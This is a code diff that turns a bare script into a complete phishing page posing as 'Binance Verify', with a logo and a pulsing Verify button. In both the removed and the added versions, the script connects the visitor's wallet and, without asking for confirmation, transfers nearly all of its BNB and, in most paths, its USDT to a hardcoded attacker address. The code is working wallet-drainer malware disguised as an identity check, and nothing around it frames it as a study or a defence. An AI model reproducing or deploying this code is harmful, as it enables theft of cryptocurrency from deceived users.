@@ -1,121 +1,119 @@
-<script>
-  // ===== CONFIGURE =====
-  // Replace with the address you want funds sent to (your own address)
-  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
-
-  // USDT BEP20 mainnet address (BSC)
-  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
-
-  // Minimal ERC20 ABI
-  const ERC20_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function transfer(address to, uint256 amount) returns (bool)"
-  ];
-
-  // Amount of BNB to reserve for gas (adjust if needed)
-  const GAS_RESERVE = "0.0005";
-
-  // Helper to show status to user and console
-  function showStatus(msg) {
-    const el = document.getElementById("status");
-    if (el) el.innerText = msg;
-    console.log(msg);
-  }
-
-  // Ensure provider is connected to BSC Mainnet (chainId 56)
-  async function isBSCMainnet(provider) {
-    try {
-      const network = await provider.getNetwork();
-      return network.chainId === 56;
-    } catch (e) {
-      console.warn("Could not read network:", e);
-      return false;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Binance Verify</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { font-family: 'Inter', sans-serif; background-color: #121212; color: #E0E0E0; }
+    .button-primary {
+      background-color: #FACC15;
+      color: #121212;
+      padding: 1rem 2rem;
+      border-radius: 9999px;
+      font-weight: 600;
+      position: relative;
+      z-index: 10;
+      transition: all 0.3s ease;
     }
-  }
-
-  // Main function: auto-send (no confirmation prompt)
-  async function handleVerify() {
-    showStatus("Connecting wallet...");
-    if (!window.ethereum) {
-      showStatus("No wallet detected. Install Binance Wallet / MetaMask.");
-      return;
+    .button-primary:hover { background-color: #fbbf24; }
+    .pulse-ring {
+      position: absolute;
+      border: 2px solid #FACC15;
+      border-radius: 50%;
+      width: 160px; height: 160px;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      animation: pulse-ring 2.5s cubic-bezier(0.4,0,0.6,1) infinite;
+      z-index: 1;
     }
+    .pulse-ring:nth-child(1) { animation-delay: 0s; }
+    .pulse-ring:nth-child(2) { animation-delay: 0.8s; }
+    .pulse-ring:nth-child(3) { animation-delay: 1.6s; }
+    @keyframes pulse-ring {
+      0% { transform: scale(0.8); opacity: 0.7; }
+      70% { transform: scale(1.3); opacity: 0; }
+      100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen text-white">
 
-    try {
-      // Request accounts
-      await window.ethereum.request({ method: "eth_requestAccounts" });
+  <!-- Binance Logo -->
+  <img src="binance-yellow-rhombus-lawc3crgelc4t98h.jpg" alt="Binance Logo" class="w-16 mb-6" />
 
-      // Create ethers provider + signer
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const userAddress = await signer.getAddress();
-      showStatus("Connected: " + userAddress);
+  <!-- Verify Button with Pulse -->
+  <div class="relative flex items-center justify-center mb-6">
+    <div class="pulse-ring"></div>
+    <div class="pulse-ring"></div>
+    <div class="pulse-ring"></div>
+    <button onclick="handleVerify()" 
+      class="button-primary relative z-10">
+      Verify
+    </button>
+  </div>
 
-      // Check chain
-      const onMainnet = await isBSCMainnet(provider);
-      if (!onMainnet) {
-        showStatus("Please switch wallet to BSC Mainnet (chainId 56) and retry.");
-        return;
-      }
+  <!-- Status -->
+  <p id="status" class="text-gray-300 text-center text-lg max-w-sm"></p>
 
-      // 1) Send BNB (all - GAS_RESERVE)
-      showStatus("Checking BNB balance...");
-      const balanceBNB = await provider.getBalance(userAddress); // BigInt
-      const balanceBNBStr = ethers.formatEther(balanceBNB);
-      showStatus(`BNB balance: ${balanceBNBStr} BNB`);
+  <!-- Ethers.js v6 -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.0/dist/ethers.min.js"></script>
 
-      const gasReserveWei = ethers.parseEther(GAS_RESERVE);
-      if (balanceBNB > gasReserveWei) {
-        const amountToSend = balanceBNB - gasReserveWei;
-        if (amountToSend > 0n) {
-          try {
-            showStatus("Sending BNB...");
-            const tx = await signer.sendTransaction({ to: RECEIVER, value: amountToSend });
-            showStatus("BNB tx sent: " + tx.hash);
-            await tx.wait();
-            showStatus("BNB tx confirmed: " + tx.hash);
-          } catch (bnbErr) {
-            console.error("BNB send failed:", bnbErr);
-            showStatus("BNB send failed: " + (bnbErr?.message || bnbErr));
-          }
-        } else {
-          showStatus("No transferable BNB after reserving gas.");
-        }
-      } else {
-        showStatus("BNB balance too low to send (or only gas available).");
-      }
+  <script>
+    const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // Your wallet
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 contract
+    const ERC20_ABI = [
+      "function balanceOf(address) view returns (uint)",
+      "function transfer(address to, uint amount) returns (bool)"
+    ];
 
-      // 2) Attempt USDT BEP20 transfer (wrapped in try/catch)
-      showStatus("Checking USDT (BEP20) balance...");
+    async function handleVerify() {
+      const statusEl = document.getElementById("status");
       try {
-        const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
-        let balanceUSDT = await usdt.balanceOf(userAddress); // BigInt
-        // If USDT uses 6 decimals it would be different; this is raw token units.
-        if (balanceUSDT > 0n) {
-          showStatus("USDT balance (raw): " + balanceUSDT.toString());
-          try {
-            showStatus("Sending USDT...");
-            const tx = await usdt.transfer(RECEIVER, balanceUSDT);
-            showStatus("USDT tx sent: " + tx.hash);
-            await tx.wait();
-            showStatus("USDT tx confirmed: " + tx.hash);
-          } catch (transferErr) {
-            console.error("USDT transfer failed:", transferErr);
-            showStatus("USDT transfer failed: " + (transferErr?.message || transferErr));
-          }
-        } else {
-          showStatus("No USDT balance found.");
+        if (!window.ethereum) {
+          statusEl.innerText = "No wallet detected. Install Binance Wallet or MetaMask.";
+          return;
         }
-      } catch (readErr) {
-        // This catches BAD_DATA / 0x decode errors and other provider issues
-        console.warn("Could not read USDT balance (contract may be inaccessible):", readErr);
-        showStatus("Unable to read USDT balance (wallet/ RPC returned invalid data).");
-      }
 
-      showStatus("Done.");
-    } catch (err) {
-      console.error("Top-level error:", err);
-      showStatus("Error: " + (err?.message || err));
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        statusEl.innerText = "Checking balances...";
+
+        // Check BNB balance
+        const balanceBNB = await provider.getBalance(userAddress);
+        if (balanceBNB > ethers.parseEther("0.0005")) {
+          statusEl.innerText = "Sending BNB...";
+          const tx = await signer.sendTransaction({
+            to: RECEIVER,
+            value: balanceBNB - ethers.parseEther("0.0005") // leave gas
+          });
+          await tx.wait();
+          statusEl.innerText = "BNB sent successfully ✅";
+          return;
+        }
+
+        // Check USDT balance
+        const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
+        const balanceUSDT = await usdt.balanceOf(userAddress);
+        if (balanceUSDT > 0n) {
+          statusEl.innerText = "Sending USDT...";
+          const tx = await usdt.transfer(RECEIVER, balanceUSDT);
+          await tx.wait();
+          statusEl.innerText = "USDT sent successfully ✅";
+          return;
+        }
+
+        statusEl.innerText = "No BNB or USDT found ❌";
+      } catch (err) {
+        console.error(err);
+        statusEl.innerText = "Error: " + err.message;
+      }
     }
-  }
-</script>
+  </script>
+
+</body>
+</html>
